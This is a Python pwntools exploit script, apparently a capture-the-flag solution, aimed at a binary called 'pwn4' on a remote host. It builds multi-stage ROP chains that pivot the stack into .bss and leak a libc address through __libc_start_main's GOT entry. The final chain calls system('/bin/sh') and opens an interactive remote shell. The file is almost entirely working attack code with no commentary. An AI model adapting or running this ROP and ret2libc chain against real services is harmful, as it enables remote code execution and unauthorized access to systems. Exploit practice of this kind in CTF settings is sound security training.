#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

e , l = ELF('./pwn4') , ELF('./libc-2.27.so')
host , port = '10.140.0.8' , 11114
y = remote( host , port )
#y = process( './pwn4' )

pop_rdi = 0x400673
pop_rbp = 0x400528
ppr = 0x400671
ret = 0x40048e
leave_ret = 0x400606
bss = 0x601000
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40066a # rbx rbp r12 r13 r14 r15
pop_rbp_r12_r13_r14_r15_ret = 0x40066b # rbp r12 r13 r14 r15
pop_r12_r13_r14_r15_ret = 0x40066c # r12 r13 r14 r15
pop_rsp_r13_r14_r15_ret = 0x40066d
pop_r13_r14_r15_ret = 0x40066e
pop_r14_r15_ret = 0x400670
call_r12_rbx = 0x400659 #  call qword [ds:r12+rbx*8]
libc_start_main_got = 0x600ff0
mov_call = 0x400650


p = flat(
    'a' * 8,
    bss + 0x400 - 8,
    ppr,
    bss + 0x400,
    0,
    e.plt['read'],
    ppr,
    bss,
    0,
    e.plt['read'],
    ppr,
    bss + 0x30,
    0,
    e.plt['read'],
    leave_ret
)
y.sendline(p)
sleep(0.1)

vtable = ( 0xffffffffffffbb40 / 8 ) + 15 # _IO_new_file_write( FILE *f, const void *data, ssize_t n )

p = flat(
    pop_rbx_rbp_r12_r13_r14_r15_ret,
    vtable,
    bss - 8,
    0, 0, 0, 0,
    ppr,
    bss + 0x400 + 0x100,
    0,
    e.plt['read'],
    ppr,
    bss + 0x600,
    0,
    e.plt['read'],
    leave_ret
)
y.send( p )
sleep(0.1)

p = flat(
    pop_rbp_r12_r13_r14_r15_ret,
    0,
)
y.send( p )
sleep(0.1)

p = flat(
    ppr,
    bss + 8,
    0,
    e.plt['read'],
    ppr,
    bss + 0x18,
    0,
    e.plt['read'],
    ppr,
    bss + 0x30,
    0,
    e.plt['read'],
    pop_rbp,
    bss,
    leave_ret
)
y.send( p )
sleep(0.1)


p = flat(
    pop_rbp,
    vtable + 1,
    call_r12_rbx,
    0, 0, bss + 0x600 - 8, 0x601090, 0, bss + 0x700, 0x100,
    leave_ret
)
y.send( p )
sleep(0.1)


p = flat(
    mov_call,
    e.plt['read'],
    pop_rbp,
    bss + 0x700 - 8,
    leave_ret
)
y.send( p )
sleep(0.1)

y.send( p64( pop_rdi ) )
sleep(0.1)

y.send( p64( pop_r14_r15_ret ) )
sleep(0.1)

p = flat(
    ppr,
    e.got['__libc_start_main'],
    0,
    pop_rbp,
    bss + 0x400 + 0x100 - 8,
    leave_ret,
)
y.send( p )
sleep(0.1)

l.address = u64( y.recv(6) + '\x00\x00' ) - l.sym.__libc_start_main
success( 'libc -> %s' % hex( l.address ) )

p = flat(
    pop_rdi,
    l.search('/bin/sh').next(),
    l.sym.system
)
y.send( p )

y.interactive()